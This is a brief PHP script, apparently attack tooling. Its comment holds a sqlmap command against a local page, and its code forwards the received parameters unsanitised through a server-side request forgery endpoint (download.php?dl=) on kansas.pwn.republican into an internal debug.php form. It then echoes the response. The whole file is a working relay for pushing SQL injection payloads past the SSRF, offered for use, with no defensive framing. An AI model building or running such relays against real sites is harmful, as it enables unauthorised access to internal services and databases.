<?php
/*
sqlmap.py -u 'http://127.0.0.1/sqliFilter.php?txtfirst_name=a&txtmiddle_name=b&txtLast_name=c&txtname_suffix=d&txtdob=1995&btnContinue2=Continue'
*/
$url = 'http://kansas.pwn.republican/download.php?dl=http://127.0.0.1/secure/debug.php?s=3%26txtfirst_name%3D'.$_GET['txtfirst_name'].'%26txtmiddle_name%3D'.$_GET['txtmiddle_name'].'%26txtLast_name%3D'.$_GET['txtLast_name'].'%26txtname_suffix%3Dt'.$_GET['txtname_suffix'].'%26txtdob%3D'.$_GET['txtdob'].'%26txtdl_nmbr%3Dccc%26txtRetypeDL%3Dccc%26btnContinue2%3D'.$_GET['btnContinue2'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_HEADER, TRUE); 
curl_setopt($ch, CURLOPT_NOBODY, FALSE); // remove body 
$data = curl_exec($ch); 
curl_close($ch); 
echo $data;
?>
